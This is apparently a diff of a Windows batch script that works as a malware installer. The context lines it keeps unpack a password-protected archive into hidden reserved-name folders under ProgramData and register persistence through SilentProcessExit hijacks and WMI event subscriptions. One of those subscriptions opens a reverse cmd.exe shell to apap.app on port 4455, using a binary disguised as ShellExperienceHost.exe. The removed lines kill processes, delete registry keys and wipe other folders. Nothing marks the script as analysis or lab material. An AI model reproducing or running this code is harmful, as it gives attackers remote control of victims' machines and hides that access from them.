@@ -5,36 +5,6 @@ mkdir %ProgramData%\Comms
 
 "%ProgramData%\Comms\UnRAR.exe" x -y -p369852147 "%ProgramData%\Comms\pac.rar" "%ProgramData%\Comms\"
 
-taskkill /f /IM Input.exe
-taskkill /f /IM ShellExt.dll
-rd /S /Q \\.\%ProgramData%\AUX..\
-rd /S /Q \\.\%ProgramData%\CON..\
-rd /S /Q  %ProgramData%\dist
-rd /S /Q  %ProgramData%\Vedist
-rd /S /Q  %ProgramData%\Cedist
-rd /S /Q  %ProgramData%\Jedist
-rd /S /Q  %ProgramData%\Uedist
-rd /S /Q  %ProgramData%\VCedist
-
-REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /f
-REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\TiWorker.exe" /f
-REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhostw.exe" /f
-REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\MoUsoCoreWorker.exe" /f
-
-REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhostw.exe" /f
-REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TiWorker.exe" /f
-REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MoUsoCoreWorker.exe" /f
-REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /f
-
-REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\info.exe" /f
-REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /f
-
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "" /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Install.exe" /t REG_SZ /d "" /f
-
-del /F /Q /A %WINDIR%\Setup\Scripts\*.cmd
-for /f "delims=" %A in ('dir C:\Users /b /ad') do @del /f /q "C:\Users\%A\AppData\Local\Microsoft\Windows\INetCookies\*.cmd" 2>nul
-
 mkdir \\.\%ProgramData%\config..\
 mkdir \\.\%ProgramData%\logdata..\
 mkdir \\.\%ProgramData%\diaglogs..\
@@ -59,15 +29,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\IconLib.dll" /f /reg:64
 
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="SCM"' DELETE
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="MCS"' DELETE
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="nut" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="nut" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="nut"' DELETE
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="nur" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="nur" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="nur"' DELETE
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="per"' DELETE
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="pers"' DELETE
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="Event" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="Event" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="Event"' DELETE
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="Consumer" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="Consumer" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="Consumer"' DELETE
-
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SCM", CommandLineTemplate="%ProgramData%\config..\ShellExperienceHost.exe --ssl apap.app 4455 -e cmd.exe"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SCM\"", Consumer="CommandLineEventConsumer.Name=\"SCM\""
@@ -79,27 +40,3 @@ wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filt
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Consumer", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 240 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Consumer", CommandLineTemplate="\\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\Kape.dll"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Consumer\"", Consumer="CommandLineEventConsumer.Name=\"Consumer\""
-
-takeown /f %ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}
-takeown /f %ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
-takeown /f %ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
-
-icacls "%ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}" /grant %username%:D /T
-icacls "%ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}" /grant %username%:D /T
-icacls "%ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /grant %username%:D /T
-
-icacls "%ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}" /grant %username%:(D,DC) /grant %username%:(RX) /T
-icacls "%ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}" /grant %username%:(D,DC) /grant %username%:(RX) /T
-icacls "%ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /grant %username%:(D,DC) /grant %username%:(RX) /T
-
-icacls "%ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}" /grant *S-1-1-0:(DE,WDAC,WO,AS,AD,WEA,DC,WA,WD) /T /C
-icacls "%ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}" /grant *S-1-1-0:(DE,WDAC,WO,AS,AD,WEA,DC,WA,WD) /T /C
-icacls "%ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /grant *S-1-1-0:(DE,WDAC,WO,AS,AD,WEA,DC,WA,WD) /T /C
-
-attrib -h -s -r %ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6} /d /s
-attrib -h -s -r %ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE} /d /s
-attrib -h -s -r %ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D} /d /s
-
-rd /S /Q  %ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}
-rd /S /Q  %ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
-rd /S /Q  %ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
